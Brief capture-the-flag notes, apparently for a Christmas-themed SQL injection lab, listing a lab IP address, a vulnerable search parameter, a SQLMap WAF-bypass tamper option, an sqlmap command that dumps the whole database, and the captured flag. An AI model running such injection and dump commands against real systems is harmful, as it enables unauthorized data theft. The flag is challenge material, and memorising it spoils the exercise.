@@ -1,0 +1,15 @@
+Someone stole Santa's gift list! - Web Exploitation
+
+http://10.10.104.66:8000/
+
+sqlite DB
+
+WAF bypass SQLMap: --tamper=space2comment
+
+10.10.104.66:8000/santapanel
+
+http://10.10.104.66:8000/santapanel?search=
+
+sqlmap -r burp_gift_search_2 --dbms SQLite --batch --dump-all > sql_map_batch.result
+
+thmfox{All_I_Want_for_Christmas_Is_You}
